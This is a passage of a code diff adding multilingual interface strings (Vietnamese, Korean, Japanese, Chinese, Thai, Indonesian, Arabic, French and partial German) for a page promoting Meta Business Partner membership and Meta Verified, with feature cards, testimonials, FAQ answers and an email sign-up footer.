+        card4_title:"Nhận giải pháp quảng cáo cá nhân hóa", card4_desc:"Xem kết quả nhanh hơn với ít bước hơn nhờ các công cụ AI tạo quảng cáo mà khách hàng muốn xem.",
+        card5_title:"Hiểu hiệu suất", card5_desc:"Truy cập theo dõi hiệu suất marketing nâng cao với tổng quan chi tiết về hành vi của đối tượng.",
+        card6_title:"Sử dụng định dạng quảng cáo hiệu quả", card6_desc:"Được thiết kế để phù hợp với các mục tiêu kinh doanh cụ thể, tiếp cận và mở rộng đối tượng của bạn trên mọi thiết bị.",
+        feedback_title:"Xem cách Meta Verified đã giúp các doanh nghiệp thực sự.",
+        testimonial1_quote:'"Sau khi đăng ký Meta Verified, tôi nhận thấy phạm vi tiếp cận bài đăng tăng lên và mức độ tương tác với khán giả cao hơn. Tôi nghĩ rằng việc thấy huy hiệu đã xác minh tạo dựng lòng tin."',
+        testimonial1_author:"Kimber Greenwood, Chủ sở hữu Water Bear Photography",
+        testimonial2_quote:'"Kể từ khi đăng ký, tôi nhận thấy sự khác biệt thực sự. Bài đăng của tôi có nhiều lượt tiếp cận hơn, mức độ tương tác tăng lên và tôi thấy nhiều tương tác hơn trên stories và reels."',
+        testimonial2_author:"Devon Kirby, Chủ sở hữu, Mom Approved Miami",
+        testimonial3_quote:'"Có tài khoản đã xác minh báo hiệu với cả người theo dõi hiện tại và khách truy cập mới rằng chúng tôi là một doanh nghiệp đáng tin cậy, chuyên nghiệp."',
+        testimonial3_author:"Sarah Clancy, Chủ sở hữu Sarah Marie Running Co.",
+        action_title:"Sẵn sàng trở thành Meta Verified?",
+        faq_title:"Câu hỏi thường gặp", faq_more:"Để biết thêm, hãy truy cập Trung tâm Trợ giúp của chúng tôi",
+        faq_q1:"Làm thế nào để biết doanh nghiệp của tôi có đủ điều kiện không?",
+        faq_a1:"Meta Verified có sẵn ở các khu vực được chọn cho các doanh nghiệp đáp ứng các yêu cầu đủ điều kiện nhất định.",
+        faq_q2:"Làm thế nào để cập nhật thông tin nếu tôi chưa đủ điều kiện?",
+        faq_a2:"Tham gia danh sách chờ của chúng tôi để cập nhật. Chúng tôi sẽ thông báo cho bạn khi Meta Verified dành cho doanh nghiệp có sẵn.",
+        faq_q3:"Tôi đã có huy hiệu đã xác minh. Điều gì sẽ xảy ra với nó?",
+        faq_a3:"Không cần thực hiện bất kỳ hành động nào để giữ huy hiệu. Chủ sở hữu huy hiệu đã xác minh hiện tại có thể đăng ký Meta Verified.",
+        footer_title:"Nhận các cập nhật mới nhất từ Meta cho doanh nghiệp.",
+        footer_desc:"Cung cấp địa chỉ email của bạn để nhận các cập nhật mới nhất từ Meta cho doanh nghiệp, bao gồm tin tức, sự kiện và cập nhật sản phẩm.",
+        footer_legal:"Bằng cách gửi biểu mẫu này, bạn đồng ý nhận thông tin liên lạc điện tử từ Meta. Bạn có thể hủy đăng ký bất kỳ lúc nào. Để biết thêm thông tin về cách Meta xử lý dữ liệu của bạn, hãy đọc Chính sách Dữ liệu của chúng tôi.",
+        footer_email:"Địa chỉ email", footer_country:"Nhập tên quốc gia...", footer_subscribe:"Đăng ký"
+      },
+      ko: {
+        nav_start:"시작하기", nav_advertise:"광고", nav_learn:"학습", nav_support:"지원",
+        hero_title:"Meta 비즈니스 파트너가 되세요",
+        hero_desc1:"Meta 비즈니스 파트너는 교육, 지원, 분석 보고 및 고객 네트워킹 기회와 같은 고유한 혜택을 누립니다.",
+        hero_desc2:"신청자는 에이전시 관리, 피드 관리 및 피드 전환 데이터를 포함한 다양한 전문 분야에 지원할 수 있습니다.",
+        btn_apply:"지금 신청하기",
+        trusted_title:"Meta 비즈니스 파트너는 신뢰할 수 있는 전문가입니다",
+        trusted_desc:"기술 및 서비스 우수성으로 Meta의 검증을 받은 글로벌 솔루션 전문가 커뮤니티에 합류하세요.",
+        learn_more:"자세히 알아보기",
+        feat1_title:"신뢰성", feat1_desc:"Meta 비즈니스 파트너 배지를 획득하여 고객에게 최고임을 증명하세요.",
+        feat2_title:"리소스 및 지원", feat2_desc:"파트너 전용 리소스, 권장 사항, 교육 및 채팅 또는 라이브 지원에 액세스하세요.",
+        explore_title:"Meta 기술이 비즈니스를 변화시키는 방법을 알아보세요.",
+        card1_title:"광고 성과 향상", card1_desc:"고급 광고 제작 도구로 캠페인 결과를 극대화하고 설정 과정을 단순화하세요.",
+        card2_title:"더 많은 사람 도달", card2_desc:"자동화된 타겟팅 도구로 제품 또는 서비스에 관심 있는 사람들에게 광고를 전달하세요.",
+        card3_title:"전문가가 되세요", card3_desc:"Meta Blueprint의 무료 온라인 강좌와 인증을 통해 마케팅 역량을 키우세요.",
+        card4_title:"맞춤형 광고 솔루션", card4_desc:"AI 도구로 고객이 원하는 광고를 더 빠르게 생성하세요.",
+        card5_title:"성과 이해", card5_desc:"고객 행동에 대한 상세한 개요로 고급 마케팅 성과 추적에 액세스하세요.",
+        card6_title:"효과적인 광고 형식 사용", card6_desc:"특정 비즈니스 목표에 맞게 설계되어 모든 기기에서 고객에게 도달하세요.",
+        feedback_title:"Meta Verified가 실제 비즈니스를 어떻게 도왔는지 확인하세요.",
+        testimonial1_quote:'"Meta Verified에 등록한 후 게시물 도달 범위가 증가하고 고객과의 참여도가 높아졌습니다."',
+        testimonial1_author:"Kimber Greenwood, Water Bear Photography 소유자",
+        testimonial2_quote:'"구독 이후 실질적인 차이를 느꼈습니다. 게시물 도달 범위가 늘고 참여도가 높아졌습니다."',
+        testimonial2_author:"Devon Kirby, Mom Approved Miami 소유자",
+        testimonial3_quote:'"인증된 계정은 기존 팔로워와 새 방문자 모두에게 우리가 신뢰할 수 있는 전문 비즈니스임을 알립니다."',
+        testimonial3_author:"Sarah Clancy, Sarah Marie Running Co. 소유자",
+        action_title:"Meta Verified가 될 준비가 되셨나요?",
+        faq_title:"자주 묻는 질문", faq_more:"자세한 내용은 도움말 센터를 방문하세요",
+        faq_q1:"내 비즈니스가 자격이 있는지 어떻게 알 수 있나요?",
+        faq_a1:"Meta Verified는 특정 자격 요건을 충족하는 비즈니스를 위해 선택된 지역에서 이용 가능합니다.",
+        faq_q2:"아직 자격이 없다면 어떻게 정보를 받을 수 있나요?",
+        faq_a2:"대기 목록에 등록하여 최신 정보를 받으세요.",
+        faq_q3:"이미 인증 배지가 있습니다. 어떻게 되나요?",
+        faq_a3:"배지를 유지하기 위한 별도의 조치가 필요하지 않습니다.",
+        footer_title:"Meta 비즈니스의 최신 업데이트를 받으세요.",
+        footer_desc:"이메일 주소를 제공하여 뉴스, 이벤트 및 제품 업데이트를 포함한 최신 업데이트를 받으세요.",
+        footer_legal:"이 양식을 제출함으로써 Meta로부터 마케팅 관련 전자 통신을 수신하는 데 동의합니다.",
+        footer_email:"이메일 주소", footer_country:"국가 이름 입력...", footer_subscribe:"구독"
+      },
+      ja: {
+        nav_start:"始める", nav_advertise:"広告", nav_learn:"学ぶ", nav_support:"サポート",
+        hero_title:"Metaビジネスパートナーになる",
+        hero_desc1:"Metaビジネスパートナーは、トレーニング、サポート、分析レポート、顧客ネットワーキングの機会などの独自のメリットを享受できます。",
+        hero_desc2:"申請者は、代理店管理、フィード管理、フィードコンバージョンデータなど、さまざまな専門分野に申し込むことができます。",
+        btn_apply:"今すぐ申し込む",
+        trusted_title:"Metaビジネスパートナーは信頼できる専門家です",
+        trusted_desc:"技術とサービスの卓越性でMetaが認定したグローバルソリューションスペシャリストのコミュニティに参加しましょう。",
+        learn_more:"詳細を見る",
+        feat1_title:"信頼性", feat1_desc:"Meta ビジネスパートナーバッジを取得して、クライアントに最高であることを示しましょう。",
+        feat2_title:"リソースとサポート", feat2_desc:"パートナー専用のリソース、推奨事項、トレーニング、チャットまたはライブサポートにアクセスできます。",
+        explore_title:"Metaテクノロジーがビジネスを変革する方法を探る。",
+        card1_title:"広告パフォーマンスを向上", card1_desc:"高度な広告作成ツールでキャンペーン結果を最大化し、設定プロセスを簡素化します。",
+        card2_title:"より多くの人にリーチ", card2_desc:"自動ターゲティングツールで製品やサービスに興味を持つ人々に広告を届けます。",
+        card3_title:"専門家になる", card3_desc:"Meta Blueprintの無料オンラインコースと認定でマーケティングスキルを向上させましょう。",
+        card4_title:"パーソナライズされた広告ソリューション", card4_desc:"AIツールでお客様が見たい広告を少ない手順で迅速に生成します。",
+        card5_title:"パフォーマンスを理解する", card5_desc:"オーディエンス行動の詳細な概要で高度なマーケティングパフォーマンス追跡にアクセスします。",
+        card6_title:"効果的な広告フォーマットを使用", card6_desc:"特定のビジネス目標に合わせ、すべてのデバイスでオーディエンスにリーチします。",
+        feedback_title:"Meta Verifiedが実際のビジネスをどのように助けたか見てみましょう。",
+        testimonial1_quote:'"Meta Verifiedに登録後、投稿のリーチが増加し、オーディエンスとのエンゲージメントが向上しました。"',
+        testimonial1_author:"Kimber Greenwood、Water Bear Photography オーナー",
+        testimonial2_quote:'"登録以来、実質的な違いを感じています。投稿のリーチが増え、エンゲージメントが向上しました。"',
+        testimonial2_author:"Devon Kirby、Mom Approved Miami オーナー",
+        testimonial3_quote:'"認証済みアカウントは、既存のフォロワーと新しい訪問者の両方に、信頼できるプロのビジネスであることを示します。"',
+        testimonial3_author:"Sarah Clancy、Sarah Marie Running Co. オーナー",
+        action_title:"Meta Verifiedになる準備はできていますか？",
+        faq_title:"よくある質問", faq_more:"詳細については、ヘルプセンターをご覧ください",
+        faq_q1:"ビジネスが対象かどうかはどうすればわかりますか？",
+        faq_a1:"Meta Verifiedは、特定の適格要件を満たすビジネスを対象に、選択された地域で利用可能です。",
+        faq_q2:"まだ対象でない場合、どうすれば情報を得られますか？",
+        faq_a2:"ウェイトリストに登録して最新情報を入手してください。",
+        faq_q3:"すでに認証バッジを持っています。どうなりますか？",
+        faq_a3:"バッジを維持するための操作は必要ありません。",
+        footer_title:"Metaビジネスの最新情報を入手する。",
+        footer_desc:"メールアドレスを入力して、ニュース、イベント、製品アップデートを含む最新情報を受け取りましょう。",
+        footer_legal:"このフォームを送信することで、Metaからのマーケティング関連の電子通信を受け取ることに同意します。",
+        footer_email:"メールアドレス", footer_country:"国名を入力...", footer_subscribe:"購読"
+      },
+      zh: {
+        nav_start:"开始", nav_advertise:"广告", nav_learn:"学习", nav_support:"支持",
+        hero_title:"成为Meta商业合作伙伴",
+        hero_desc1:"Meta商业合作伙伴享有独特的福利，例如培训、支持、分析报告和客户网络机会。",
+        hero_desc2:"申请者可以申请多种专业方向，包括代理商管理、信息流管理和信息流转化数据。",
+        btn_apply:"立即申请",
+        trusted_title:"Meta商业合作伙伴是值得信赖的专家",
+        trusted_desc:"加入我们经过Meta技术和服务卓越性认证的全球解决方案专家社区。",
+        learn_more:"了解更多",
+        feat1_title:"信誉", feat1_desc:"获得Meta商业合作伙伴徽章，向客户展示您是最优秀的。",
+        feat2_title:"资源与支持", feat2_desc:"获得合作伙伴专属资源、建议、培训以及聊天或实时支持。",
+        explore_title:"探索Meta技术如何帮助您的企业转型。",
+        card1_title:"提升广告效果", card1_desc:"使用先进的广告创建工具最大化活动结果并简化设置流程。",
+        card2_title:"触达更多人群", card2_desc:"借助自动定向工具，将广告推送给最可能对您产品或服务感兴趣的人。",
+        card3_title:"成为专家", card3_desc:"通过Meta Blueprint的免费在线课程和认证提升您的营销技能。",
+        card4_title:"获取个性化广告解决方案", card4_desc:"借助AI工具，以更少的步骤更快地生成客户想要看到的广告。",
+        card5_title:"了解效果", card5_desc:"访问高级营销效果跟踪，获取受众行为的详细概述。",
+        card6_title:"使用有效的广告格式", card6_desc:"专为特定业务目标设计，在每台设备上触达并扩展您的受众。",
+        feedback_title:"了解Meta Verified如何帮助真实企业。",
+        testimonial1_quote:'"加入Meta Verified后，我注意到帖子的覆盖范围增加，与受众的互动也更高了。"',
+        testimonial1_author:"Kimber Greenwood，Water Bear Photography 所有者",
+        testimonial2_quote:'"订阅后，我注意到了真正的变化。我的帖子获得了更多覆盖，互动率提高了。"',
+        testimonial2_author:"Devon Kirby，Mom Approved Miami 所有者",
+        testimonial3_quote:'"经过认证的账户向现有粉丝和新访客表明我们是可信赖的专业企业。"',
+        testimonial3_author:"Sarah Clancy，Sarah Marie Running Co. 所有者",
+        action_title:"准备好成为Meta Verified了吗？",
+        faq_title:"常见问题", faq_more:"更多信息，请访问我们的帮助中心",
+        faq_q1:"我如何知道我的企业是否符合条件？",
+        faq_a1:"Meta Verified在选定地区为满足特定资格要求的企业提供服务。",
+        faq_q2:"如果我尚不符合条件，如何获取信息？",
+        faq_a2:"加入我们的等待名单以获取最新信息。",
+        faq_q3:"我已经有了认证徽章。会怎样？",
+        faq_a3:"无需采取任何操作即可保留您的徽章。",
+        footer_title:"获取Meta商业最新动态。",
+        footer_desc:"提供您的电子邮件地址，接收Meta商业的最新动态，包括新闻、活动和产品更新。",
+        footer_legal:"提交此表单，即表示您同意接收Meta的营销相关电子通讯。",
+        footer_email:"电子邮件地址", footer_country:"输入国家名称...", footer_subscribe:"订阅"
+      },
+      th: {
+        nav_start:"เริ่มต้น", nav_advertise:"โฆษณา", nav_learn:"เรียนรู้", nav_support:"สนับสนุน",
+        hero_title:"เป็นพาร์ทเนอร์ธุรกิจ Meta",
+        hero_desc1:"พาร์ทเนอร์ธุรกิจ Meta ได้รับสิทธิประโยชน์พิเศษ เช่น การฝึกอบรม การสนับสนุน การรายงานเชิงวิเคราะห์ และโอกาสในการสร้างเครือข่าย",
+        hero_desc2:"ผู้สมัครสามารถสมัครในความเชี่ยวชาญหลายด้าน รวมถึงการจัดการเอเจนซี่ การจัดการฟีด และข้อมูลการแปลงฟีด",
+        btn_apply:"สมัครเลย",
+        trusted_title:"พาร์ทเนอร์ธุรกิจ Meta คือผู้เชี่ยวชาญที่เชื่อถือได้",
+        trusted_desc:"เข้าร่วมชุมชนผู้เชี่ยวชาญด้านโซลูชันระดับโลกของเรา ที่ผ่านการรับรองจาก Meta ในด้านความเป็นเลิศทางเทคนิคและการบริการ",
+        learn_more:"เรียนรู้เพิ่มเติม",
+        feat1_title:"ความน่าเชื่อถือ", feat1_desc:"รับ badge พาร์ทเนอร์ธุรกิจ Meta เพื่อแสดงให้ลูกค้าเห็นว่าคุณเก่งที่สุด",
+        feat2_title:"ทรัพยากรและการสนับสนุน", feat2_desc:"เข้าถึงทรัพยากรเฉพาะสำหรับพาร์ทเนอร์ คำแนะนำ การฝึกอบรม และการสนับสนุน",
+        explore_title:"สำรวจวิธีที่เทคโนโลยี Meta ช่วยเปลี่ยนแปลงธุรกิจของคุณ",
+        card1_title:"ปรับปรุงประสิทธิภาพโฆษณา", card1_desc:"เพิ่มผลลัพธ์ของแคมเปญให้สูงสุดด้วยเครื่องมือสร้างโฆษณาขั้นสูง",
+        card2_title:"เข้าถึงผู้คนมากขึ้น", card2_desc:"ส่งโฆษณาไปยังผู้ที่มีแนวโน้มสนใจสินค้าหรือบริการของคุณด้วยเครื่องมือกำหนดเป้าหมายอัตโนมัติ",
+        card3_title:"เป็นผู้เชี่ยวชาญ", card3_desc:"พัฒนาทักษะการตลาดด้วยหลักสูตรออนไลน์ฟรีผ่าน Meta Blueprint",
+        card4_title:"รับโซลูชันโฆษณาส่วนตัว", card4_desc:"เห็นผลเร็วขึ้นด้วยขั้นตอนน้อยลงด้วยเครื่องมือ AI ที่สร้างโฆษณาที่ลูกค้าต้องการ",
+        card5_title:"เข้าใจประสิทธิภาพ", card5_desc:"เข้าถึงการติดตามประสิทธิภาพการตลาดขั้นสูงพร้อมภาพรวมพฤติกรรมของกลุ่มเป้าหมาย",
+        card6_title:"ใช้รูปแบบโฆษณาที่ได้ผล", card6_desc:"ออกแบบมาเพื่อเป้าหมายทางธุรกิจเฉพาะ เข้าถึงและขยายกลุ่มเป้าหมายบนทุกอุปกรณ์",
+        feedback_title:"ดูว่า Meta Verified ช่วยธุรกิจจริงได้อย่างไร",
+        testimonial1_quote:'"หลังจากลงทะเบียน Meta Verified ฉันสังเกตเห็นการเข้าถึงโพสต์ที่เพิ่มขึ้นและการมีส่วนร่วมกับผู้ชมที่สูงขึ้น"',
+        testimonial1_author:"Kimber Greenwood เจ้าของ Water Bear Photography",
+        testimonial2_quote:'"ตั้งแต่สมัครสมาชิก ฉันสังเกตเห็นความแตกต่างที่แท้จริง โพสต์ของฉันได้รับการเข้าถึงมากขึ้น"',
+        testimonial2_author:"Devon Kirby เจ้าของ Mom Approved Miami",
+        testimonial3_quote:'"การมีบัญชีที่ยืนยันแล้วแสดงให้ทั้งผู้ติดตามเดิมและผู้เยี่ยมชมใหม่เห็นว่าเราเป็นธุรกิจที่น่าเชื่อถือและเป็นมืออาชีพ"',
+        testimonial3_author:"Sarah Clancy เจ้าของ Sarah Marie Running Co.",
+        action_title:"พร้อมที่จะเป็น Meta Verified แล้วหรือยัง?",
+        faq_title:"คำถามที่พบบ่อย", faq_more:"สำหรับข้อมูลเพิ่มเติม เยี่ยมชมศูนย์ช่วยเหลือของเรา",
+        faq_q1:"ฉันจะรู้ได้อย่างไรว่าธุรกิจของฉันมีคุณสมบัติ?",
+        faq_a1:"Meta Verified พร้อมใช้งานในภูมิภาคที่เลือกสำหรับธุรกิจที่ตรงตามข้อกำหนดคุณสมบัติ",
+        faq_q2:"ฉันจะรับข้อมูลได้อย่างไรหากยังไม่มีคุณสมบัติ?",
+        faq_a2:"เข้าร่วมรายการรอของเราเพื่ออัปเดต",
+        faq_q3:"ฉันมี badge ที่ยืนยันแล้ว จะเกิดอะไรขึ้น?",
+        faq_a3:"ไม่จำเป็นต้องดำเนินการใดๆ เพื่อเก็บ badge ไว้",
+        footer_title:"รับอัปเดตล่าสุดจาก Meta สำหรับธุรกิจ",
+        footer_desc:"ให้ที่อยู่อีเมลของคุณเพื่อรับอัปเดตล่าสุดจาก Meta สำหรับธุรกิจ",
+        footer_legal:"การส่งแบบฟอร์มนี้ถือว่าคุณยินยอมรับการสื่อสารทางการตลาดจาก Meta",
+        footer_email:"ที่อยู่อีเมล", footer_country:"ป้อนชื่อประเทศ...", footer_subscribe:"สมัคร"
+      },
+      id: {
+        nav_start:"Mulai", nav_advertise:"Iklan", nav_learn:"Pelajari", nav_support:"Dukungan",
+        hero_title:"Jadilah Mitra Bisnis Meta",
+        hero_desc1:"Mitra bisnis Meta menikmati manfaat unik seperti pelatihan, dukungan, pelaporan analitik, dan peluang jaringan pelanggan.",
+        hero_desc2:"Pemohon dapat mendaftar untuk berbagai spesialisasi, termasuk manajemen agen, manajemen feed, dan data konversi feed.",
+        btn_apply:"Daftar sekarang",
+        trusted_title:"Mitra Bisnis Meta adalah para ahli terpercaya",
+        trusted_desc:"Bergabunglah dengan komunitas global spesialis solusi kami, yang diverifikasi oleh Meta untuk keunggulan teknis dan layanan.",
+        learn_more:"Pelajari lebih lanjut",
+        feat1_title:"Kredibilitas", feat1_desc:"Dapatkan lencana Mitra Bisnis Meta untuk menunjukkan kepada klien bahwa Anda yang terbaik.",
+        feat2_title:"Sumber daya dan dukungan", feat2_desc:"Dapatkan akses ke sumber daya khusus mitra, rekomendasi, pelatihan, dan dukungan.",
+        explore_title:"Jelajahi bagaimana teknologi Meta dapat membantu mengubah bisnis Anda.",
+        card1_title:"Tingkatkan kinerja iklan", card1_desc:"Maksimalkan hasil kampanye dan sederhanakan proses pengaturan dengan alat pembuatan iklan canggih.",
+        card2_title:"Jangkau lebih banyak orang", card2_desc:"Tampilkan iklan kepada orang yang paling mungkin tertarik dengan produk atau layanan Anda.",
+        card3_title:"Jadilah ahli", card3_desc:"Tingkatkan keterampilan pemasaran Anda dengan kursus online gratis melalui Meta Blueprint.",
+        card4_title:"Solusi iklan yang dipersonalisasi", card4_desc:"Lihat hasil lebih cepat dengan alat AI yang menghasilkan iklan yang diinginkan pelanggan.",
+        card5_title:"Pahami kinerja", card5_desc:"Akses pelacakan kinerja pemasaran canggih dengan gambaran umum perilaku audiens.",
+        card6_title:"Gunakan format iklan yang efektif", card6_desc:"Dirancang untuk tujuan bisnis tertentu, menjangkau audiens di setiap perangkat.",
+        feedback_title:"Lihat bagaimana Meta Verified telah membantu bisnis nyata.",
+        testimonial1_quote:'"Setelah mendaftar Meta Verified, saya melihat jangkauan postingan meningkat dan keterlibatan dengan audiens lebih tinggi."',
+        testimonial1_author:"Kimber Greenwood, Pemilik Water Bear Photography",
+        testimonial2_quote:'"Sejak berlangganan, saya merasakan perbedaan nyata. Postingan saya mendapat lebih banyak jangkauan dan keterlibatan meningkat."',
+        testimonial2_author:"Devon Kirby, Pemilik Mom Approved Miami",
+        testimonial3_quote:'"Akun terverifikasi memberi sinyal kepada pengikut dan pengunjung baru bahwa kami adalah bisnis profesional yang kredibel."',
+        testimonial3_author:"Sarah Clancy, Pemilik Sarah Marie Running Co.",
+        action_title:"Siap menjadi Meta Verified?",
+        faq_title:"Pertanyaan Umum", faq_more:"Untuk selengkapnya, kunjungi Pusat Bantuan kami",
+        faq_q1:"Bagaimana cara mengetahui apakah bisnis saya memenuhi syarat?",
+        faq_a1:"Meta Verified tersedia di wilayah tertentu untuk bisnis yang memenuhi persyaratan kelayakan tertentu.",
+        faq_q2:"Bagaimana saya bisa mendapatkan informasi jika belum memenuhi syarat?",
+        faq_a2:"Bergabunglah dengan daftar tunggu kami untuk tetap mendapat informasi terbaru.",
+        faq_q3:"Saya sudah memiliki lencana terverifikasi. Apa yang terjadi?",
+        faq_a3:"Tidak ada tindakan yang diperlukan untuk mempertahankan lencana Anda.",
+        footer_title:"Dapatkan pembaruan terbaru dari Meta untuk bisnis.",
+        footer_desc:"Berikan alamat email Anda untuk menerima pembaruan terbaru dari Meta untuk bisnis.",
+        footer_legal:"Dengan mengirimkan formulir ini, Anda setuju untuk menerima komunikasi pemasaran dari Meta.",
+        footer_email:"Alamat email", footer_country:"Masukkan nama negara...", footer_subscribe:"Langganan"
+      },
+      ar: {
+        nav_start:"ابدأ", nav_advertise:"إعلان", nav_learn:"تعلم", nav_support:"الدعم",
+        hero_title:"كن شريكاً تجارياً لـ Meta",
+        hero_desc1:"يتمتع شركاء أعمال Meta بمزايا فريدة مثل التدريب والدعم والتقارير التحليلية وفرص التواصل مع العملاء.",
+        hero_desc2:"يمكن للمتقدمين التقدم لتخصصات متنوعة، بما في ذلك إدارة الوكالات وإدارة الخلاصات وبيانات التحويل.",
+        btn_apply:"تقدم الآن",
+        trusted_title:"شركاء أعمال Meta خبراء موثوقون",
+        trusted_desc:"انضم إلى مجتمعنا العالمي من متخصصي الحلول المعتمدين من Meta للتميز التقني والخدمي.",
+        learn_more:"تعرف على المزيد",
+        feat1_title:"المصداقية", feat1_desc:"احصل على شارة شركاء أعمال Meta لتُظهر للعملاء أنك الأفضل.",
+        feat2_title:"الموارد والدعم", feat2_desc:"احصل على موارد خاصة بالشركاء وتوصيات وتدريب ودعم.",
+        explore_title:"استكشف كيف يمكن لتقنيات Meta مساعدة عملك على التحول.",
+        card1_title:"تحسين أداء الإعلانات", card1_desc:"زد نتائج الحملات إلى الحد الأقصى وبسّط عملية الإعداد بأدوات إنشاء الإعلانات المتقدمة.",
+        card2_title:"الوصول إلى المزيد من الأشخاص", card2_desc:"وجّه الإعلانات للأشخاص الأكثر اهتماماً بمنتجاتك أو خدماتك.",
+        card3_title:"كن خبيراً", card3_desc:"طور مهاراتك التسويقية من خلال الدورات المجانية عبر Meta Blueprint.",
+        card4_title:"احصل على حلول إعلانية مخصصة", card4_desc:"حقق نتائج أسرع بخطوات أقل مع أدوات AI التي تنشئ الإعلانات التي يريدها عملاؤك.",
+        card5_title:"افهم الأداء", card5_desc:"احصل على تتبع متقدم لأداء التسويق مع نظرة عامة مفصلة على سلوك الجمهور.",
+        card6_title:"استخدم تنسيقات الإعلانات الفعّالة", card6_desc:"مصممة لأهداف عمل محددة، للوصول إلى جمهورك وتوسيعه عبر كل الأجهزة.",
+        feedback_title:"انظر كيف ساعد Meta Verified الشركات الحقيقية.",
+        testimonial1_quote:'"بعد الانضمام إلى Meta Verified، لاحظت زيادة في نطاق وصول منشوراتي وتفاعلاً أعلى مع جمهوري."',
+        testimonial1_author:"Kimber Greenwood، مالكة Water Bear Photography",
+        testimonial2_quote:'"منذ الاشتراك، لاحظت فرقاً حقيقياً. منشوراتي تصل إلى نطاق أوسع والتفاعل ارتفع."',
+        testimonial2_author:"Devon Kirby، مالكة Mom Approved Miami",
+        testimonial3_quote:'"وجود حساب موثق يُشير إلى متابعينا الحاليين والزوار الجدد بأننا شركة موثوقة واحترافية."',
+        testimonial3_author:"Sarah Clancy، مالكة Sarah Marie Running Co.",
+        action_title:"هل أنت مستعد لتصبح Meta Verified؟",
+        faq_title:"الأسئلة الشائعة", faq_more:"لمزيد من المعلومات، تفضل بزيارة مركز المساعدة",
+        faq_q1:"كيف أعرف ما إذا كان عملي مؤهلاً؟",
+        faq_a1:"Meta Verified متاح في مناطق مختارة للشركات التي تستوفي متطلبات معينة.",
+        faq_q2:"كيف يمكنني البقاء على اطلاع إذا لم أكن مؤهلاً بعد؟",
+        faq_a2:"انضم إلى قائمة الانتظار لدينا للبقاء على اطلاع.",
+        faq_q3:"لدي بالفعل شارة تحقق. ماذا سيحدث لها؟",
+        faq_a3:"لا حاجة لأي إجراء للاحتفاظ بشارتك.",
+        footer_title:"احصل على آخر التحديثات من Meta للأعمال.",
+        footer_desc:"أدخل عنوان بريدك الإلكتروني لتلقي آخر التحديثات.",
+        footer_legal:"بإرسال هذا النموذج، توافق على تلقي اتصالات تسويقية من Meta.",
+        footer_email:"البريد الإلكتروني", footer_country:"أدخل اسم الدولة...", footer_subscribe:"اشترك"
+      },
+      fr: {
+        nav_start:"Commencer", nav_advertise:"Publicité", nav_learn:"Apprendre", nav_support:"Support",
+        hero_title:"Devenez un partenaire commercial Meta",
+        hero_desc1:"Les partenaires commerciaux Meta bénéficient d'avantages uniques tels que la formation, le support, les rapports analytiques et les opportunités de mise en réseau.",
+        hero_desc2:"Les candidats peuvent postuler pour diverses spécialisations, notamment la gestion d'agence et la gestion de flux.",
+        btn_apply:"Postuler maintenant",
+        trusted_title:"Les partenaires commerciaux Meta sont des experts de confiance",
+        trusted_desc:"Rejoignez notre communauté mondiale de spécialistes des solutions, vérifiés par Meta pour l'excellence technique et de service.",
+        learn_more:"En savoir plus",
+        feat1_title:"Crédibilité", feat1_desc:"Obtenez le badge Partenaires commerciaux Meta pour montrer à vos clients que vous êtes le meilleur.",
+        feat2_title:"Ressources et support", feat2_desc:"Accédez à des ressources spécifiques aux partenaires, des recommandations, des formations et un support.",
+        explore_title:"Découvrez comment les technologies Meta peuvent transformer votre entreprise.",
+        card1_title:"Améliorez les performances des annonces", card1_desc:"Maximisez les résultats des campagnes et simplifiez le processus de configuration.",
+        card2_title:"Touchez plus de personnes", card2_desc:"Diffusez des annonces aux personnes les plus susceptibles d'être intéressées par vos produits.",
+        card3_title:"Devenez un expert", card3_desc:"Améliorez vos compétences marketing avec des cours gratuits via Meta Blueprint.",
+        card4_title:"Obtenez des solutions publicitaires personnalisées", card4_desc:"Obtenez des résultats plus rapides avec des outils IA qui génèrent des annonces pertinentes.",
+        card5_title:"Comprenez les performances", card5_desc:"Accédez au suivi des performances marketing avec des aperçus détaillés du comportement de l'audience.",
+        card6_title:"Utilisez des formats publicitaires efficaces", card6_desc:"Conçu pour atteindre votre audience sur tous les appareils.",
+        feedback_title:"Voyez comment Meta Verified a aidé de vraies entreprises.",
+        testimonial1_quote:'"Après m\'être inscrit à Meta Verified, j\'ai remarqué une portée accrue et un engagement plus élevé avec mon audience."',
+        testimonial1_author:"Kimber Greenwood, Propriétaire de Water Bear Photography",
+        testimonial2_quote:'"Depuis mon abonnement, j\'ai remarqué une vraie différence. Mes publications ont plus de portée et l\'engagement a augmenté."',
+        testimonial2_author:"Devon Kirby, Propriétaire, Mom Approved Miami",
+        testimonial3_quote:'"Avoir un compte vérifié signale à nos abonnés et nouveaux visiteurs que nous sommes une entreprise professionnelle et crédible."',
+        testimonial3_author:"Sarah Clancy, Propriétaire de Sarah Marie Running Co.",
+        action_title:"Prêt à devenir Meta Verified?",
+        faq_title:"FAQ", faq_more:"Pour plus d'informations, visitez notre centre d'aide",
+        faq_q1:"Comment savoir si mon entreprise est éligible?",
+        faq_a1:"Meta Verified est disponible dans certaines régions pour les entreprises qui répondent à certaines conditions d'éligibilité.",
+        faq_q2:"Comment rester informé si je ne suis pas encore éligible?",
+        faq_a2:"Rejoignez notre liste d'attente pour rester informé.",
+        faq_q3:"J'ai déjà un badge vérifié. Que se passe-t-il?",
+        faq_a3:"Aucune action n'est nécessaire pour conserver votre badge.",
+        footer_title:"Recevez les dernières mises à jour de Meta pour les entreprises.",
+        footer_desc:"Fournissez votre adresse e-mail pour recevoir les dernières mises à jour.",
+        footer_legal:"En soumettant ce formulaire, vous acceptez de recevoir des communications marketing de Meta.",
+        footer_email:"Adresse e-mail", footer_country:"Entrez un nom de pays...", footer_subscribe:"S'abonner"
+      },
+      de: {
+        nav_start:"Loslegen", nav_advertise:"Werbung", nav_learn:"Lernen", nav_support:"Support",
+        hero_title:"Werden Sie Meta Business Partner",
+        hero_desc1:"Meta-Geschäftspartner genießen einzigartige Vorteile wie Schulung, Support, Analyseberichte und Networking-Möglichkeiten.",
+        hero_desc2:"Bewerber können sich für verschiedene Spezialisierungen bewerben, einschließlich Agenturverwaltung und Feed-Management.",
+        btn_apply:"Jetzt bewerben",
+        trusted_title:"Meta Business Partner sind vertrauenswürdige Experten",
+        trusted_desc:"Treten Sie unserer globalen Gemeinschaft von Lösungsspezialisten bei, die von Meta für technische und serviceliche Exzellenz geprüft wurden.",
+        learn_more:"Mehr erfahren",
+        feat1_title:"Glaubwürdigkeit", feat1_desc:"Verdienen Sie das Meta Business Partners-Abzeichen, um Kunden zu zeigen, dass Sie der Beste sind.",
